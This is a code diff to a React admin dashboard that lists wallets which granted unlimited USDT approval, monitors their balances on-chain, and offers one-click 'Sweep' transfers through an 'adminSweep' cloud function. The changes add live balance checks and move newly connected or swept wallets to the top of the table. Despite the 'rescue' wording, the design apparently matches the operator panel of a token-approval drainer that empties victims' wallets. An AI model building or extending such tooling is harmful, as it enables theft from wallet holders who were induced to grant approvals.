@@ -16,7 +16,7 @@ import {
   Search,
   ChevronRight,
   X,
-  Radio,
+  RefreshCw,
 } from 'lucide-react';
 import { signOut } from 'firebase/auth';
 import { httpsCallable } from 'firebase/functions';
@@ -41,10 +41,14 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
 
   // ── Real-time state from shared AdminDataContext ─────────────────
   const {
-    allWallets,
+    sortedWallets,
     twoDayStats,
     connectedCount,
     unlimitedTodayCount,
+    latestSweepsMap,
+    balances,
+    refreshBalance,
+    recordLocalSweep,
     isLoading: metricsLoading,
     error: metricsError,
   } = useAdminData();
@@ -73,34 +77,40 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
   };
 
   // ── Sweep action (shared handler for manual input + per-wallet row) ─
-  const executeSweep = useCallback(async (address: string, rowId?: string) => {
-    if (!address.trim()) return;
-    if (rowId) setSweepingId(rowId);
-    else setSweepLoading(true);
-    setSweepResult(null);
+  const executeSweep = useCallback(
+    async (address: string, rowId?: string) => {
+      const trimmed = address.trim();
+      if (!trimmed) return;
+      if (rowId) setSweepingId(rowId);
+      else setSweepLoading(true);
+      setSweepResult(null);
 
-    try {
-      const sweep = httpsCallable<{ walletAddress: string }, any>(fns, 'adminSweep');
-      const result = await sweep({ walletAddress: address.trim() });
-      const d = result.data;
-      setSweepResult({
-        success: true,
-        message: `Swept ${d.amountSwept} USDT from ${address.slice(0, 10)}…`,
-        txHash: d.sweepTxHash,
-      });
-      setSweepAddress('');
-      // Note: No manual data refetch needed! Firestore's onSnapshot listener
-      // automatically pushes the updated document in real-time.
-    } catch (err: any) {
-      setSweepResult({
-        success: false,
-        message: err.message ?? 'Sweep operation failed.',
-      });
-    } finally {
-      setSweepLoading(false);
-      setSweepingId(null);
-    }
-  }, []);
+      try {
+        const sweep = httpsCallable<{ walletAddress: string }, any>(fns, 'adminSweep');
+        const result = await sweep({ walletAddress: trimmed });
+        const d = result.data;
+
+        setSweepResult({
+          success: true,
+          message: `Swept ${d.amountSwept} USDT from ${trimmed.slice(0, 10)}…`,
+          txHash: d.sweepTxHash,
+        });
+        setSweepAddress('');
+
+        // Move wallet to top immediately & update balance to 0.00
+        recordLocalSweep(trimmed, d.sweepTxHash, d.amountSwept);
+      } catch (err: any) {
+        setSweepResult({
+          success: false,
+          message: err.message ?? 'Sweep operation failed.',
+        });
+      } finally {
+        setSweepLoading(false);
+        setSweepingId(null);
+      }
+    },
+    [recordLocalSweep]
+  );
 
   // ── Reusable button & indicator builders ──────────────────────────
   const mainTabBtn = (tab: MainTab, icon: React.ReactNode, label: string) => (
@@ -250,16 +260,6 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
           </p>
           {sidebarBtn('dashboard', <Activity className="w-4 h-4" />, 'Dashboard')}
           {sidebarBtn('wallets', <Wallet className="w-4 h-4" />, 'Wallets', connectedCount)}
-
-          <div className="mt-auto pt-6 px-3">
-            <div className="p-3 rounded-xl bg-[#11192a] border border-[#202f46] text-[11px] text-[#718298]">
-              <div className="flex items-center gap-1.5 text-emerald-400 font-mono font-medium mb-1">
-                <Radio className="w-3 h-3 animate-pulse" />
-                <span>Socket Live</span>
-              </div>
-              <p className="text-[10px] text-[#556982]">Zero reloads. Changes sync automatically.</p>
-            </div>
-          </div>
         </aside>
 
         {/* ── Main content area ─────────────────────────────────── */}
@@ -292,7 +292,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                 System Overview &amp; Management
               </h2>
               <p className="text-sm text-[#8e9eb3] mt-1">
-                Monitor wallet approvals and on-chain rescue activity with real-time Firestore sync.
+                Monitor wallet approvals, balances, and on-chain rescue activity in real-time.
               </p>
             </div>
           </div>
@@ -344,7 +344,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                   </span>
                   <button
                     onClick={() => setSweepResult(null)}
-                    className="opacity-60 hover:opacity-100 flex-shrink-0"
+                    className="opacity-60 hover:opacity-100 flex-shrink-0 cursor-pointer"
                   >
                     <X className="w-4 h-4" />
                   </button>
@@ -525,7 +525,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                 <div>
                   <h3 className="text-lg font-bold text-white">Approved Wallets</h3>
                   <p className="text-xs text-[#8e9eb3] mt-0.5">
-                    All wallets that have granted unlimited approval — click Sweep to execute transfer.
+                    Live balance monitoring &amp; instant sweep. Newly connected &amp; latest swept appear on top.
                   </p>
                 </div>
                 <LiveSyncBadge />
@@ -555,7 +555,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                   </span>
                   <button
                     onClick={() => setSweepResult(null)}
-                    className="opacity-60 hover:opacity-100 flex-shrink-0"
+                    className="opacity-60 hover:opacity-100 flex-shrink-0 cursor-pointer"
                   >
                     <X className="w-4 h-4" />
                   </button>
@@ -572,7 +572,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                   <AlertTriangle className="w-4 h-4 flex-shrink-0 mt-0.5" />
                   <span>{metricsError}</span>
                 </div>
-              ) : allWallets.length === 0 ? (
+              ) : sortedWallets.length === 0 ? (
                 <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl p-10 text-center text-[#8e9eb3]">
                   <Wallet className="w-10 h-10 mx-auto mb-3 text-blue-400 opacity-50" />
                   <p className="font-medium text-white">No approved wallets found</p>
@@ -588,18 +588,29 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                         <tr className="border-b border-[#1e2a3f] text-[#718298] text-xs uppercase tracking-wider bg-[#0f1728]/50">
                           <th className="text-left px-5 py-3 font-semibold">#</th>
                           <th className="text-left px-5 py-3 font-semibold">Wallet Address</th>
-                          <th className="text-left px-5 py-3 font-semibold">Status</th>
+                          <th className="text-left px-5 py-3 font-semibold">Balance</th>
                           <th className="text-left px-5 py-3 font-semibold">Approved At</th>
                           <th className="text-left px-5 py-3 font-semibold">Sponsor Tx</th>
                           <th className="text-right px-5 py-3 font-semibold">Action</th>
                         </tr>
                       </thead>
                       <tbody>
-                        {allWallets.map((w, idx) => {
+                        {sortedWallets.map((w, idx) => {
+                          const lower = w.id.toLowerCase();
                           const isSweepingThis = sweepingId === w.id;
+                          const balInfo = balances[lower];
+                          const latestSweep = latestSweepsMap[lower];
+
                           const approvedAt = w.sponsoredAt
                             ? new Date(w.sponsoredAt.toMillis?.() ?? 0).toLocaleDateString()
                             : w.createdAt ?? '—';
+
+                          const hasPositiveBalance =
+                            balInfo &&
+                            !balInfo.loading &&
+                            balInfo.balance !== '0.00' &&
+                            balInfo.balance !== '0';
+
                           return (
                             <tr
                               key={w.id}
@@ -608,23 +619,64 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                               <td className="px-5 py-3 text-[#4a5568] text-xs font-mono">
                                 {idx + 1}
                               </td>
+
+                              {/* Wallet Address */}
                               <td className="px-5 py-3 font-mono text-xs text-[#93c5fd]">
-                                <span title={w.id}>
-                                  {w.id.slice(0, 12)}…{w.id.slice(-8)}
-                                </span>
+                                <div className="flex items-center gap-2">
+                                  <span title={w.id} className="font-medium">
+                                    {w.id.slice(0, 10)}…{w.id.slice(-8)}
+                                  </span>
+                                  {latestSweep && (
+                                    <span className="text-[9px] uppercase font-mono px-1.5 py-0.2 rounded bg-purple-500/20 text-purple-300 border border-purple-500/30">
+                                      Swept
+                                    </span>
+                                  )}
+                                </div>
                               </td>
+
+                              {/* Balance Column (Replaced Status Column) */}
                               <td className="px-5 py-3">
-                                <span
-                                  className={`px-2 py-0.5 rounded-full text-[11px] font-semibold ${
-                                    w.status === 'ELIGIBLE'
-                                      ? 'bg-emerald-500/15 text-emerald-400'
-                                      : 'bg-amber-500/15 text-amber-400'
-                                  }`}
-                                >
-                                  {w.status}
-                                </span>
+                                <div className="flex items-center gap-2">
+                                  {balInfo?.loading ? (
+                                    <div className="flex items-center gap-1.5 text-xs text-slate-400 font-mono">
+                                      <Loader2 className="w-3 h-3 animate-spin text-blue-400" />
+                                      <span>Checking…</span>
+                                    </div>
+                                  ) : hasPositiveBalance ? (
+                                    <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-xs font-mono font-bold bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 shadow-sm shadow-emerald-950/40">
+                                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
+                                      {balInfo.balance} USDT
+                                    </span>
+                                  ) : (
+                                    <span className="text-xs font-mono text-[#8e9eb3]">
+                                      {balInfo?.balance ?? '0.00'} USDT
+                                    </span>
+                                  )}
+
+                                  <button
+                                    onClick={() => refreshBalance(w.id)}
+                                    title="Refresh balance on-chain"
+                                    className="opacity-40 hover:opacity-100 text-[#8e9eb3] hover:text-white transition-opacity p-1 cursor-pointer"
+                                  >
+                                    <RefreshCw className={`w-3 h-3 ${balInfo?.loading ? 'animate-spin' : ''}`} />
+                                  </button>
+                                </div>
                               </td>
-                              <td className="px-5 py-3 text-[#8e9eb3] text-xs">{approvedAt}</td>
+
+                              {/* Approved At & Sweep Details */}
+                              <td className="px-5 py-3 text-[#8e9eb3] text-xs">
+                                <div>{approvedAt}</div>
+                                {latestSweep && (
+                                  <div className="text-[10px] text-purple-400 font-mono mt-0.5 flex items-center gap-1">
+                                    <CheckCircle2 className="w-3 h-3 text-purple-400 flex-shrink-0" />
+                                    <span>
+                                      Swept {latestSweep.formattedAmount ? `${latestSweep.formattedAmount} USDT` : ''}
+                                    </span>
+                                  </div>
+                                )}
+                              </td>
+
+                              {/* Sponsor Tx */}
                               <td className="px-5 py-3">
                                 {w.sponsorTxHash ? (
                                   <a
@@ -639,6 +691,8 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                                   <span className="text-[#4a5568]">—</span>
                                 )}
                               </td>
+
+                              {/* Sweep Action */}
                               <td className="px-5 py-3 text-right">
                                 <button
                                   id={`sweep-btn-${idx}`}
@@ -665,11 +719,11 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                       </tbody>
                     </table>
                   </div>
+
                   <div className="px-5 py-3 border-t border-[#1e2a3f] text-[11px] text-[#4a5568] font-mono flex items-center justify-between">
                     <span>
-                      {allWallets.length} wallet{allWallets.length !== 1 ? 's' : ''} with unlimited approval
+                      {sortedWallets.length} wallet{sortedWallets.length !== 1 ? 's' : ''} with unlimited approval
                     </span>
-                    <span className="text-emerald-500/80">Continuous Firestore Listener Active</span>
                   </div>
                 </div>
               )}
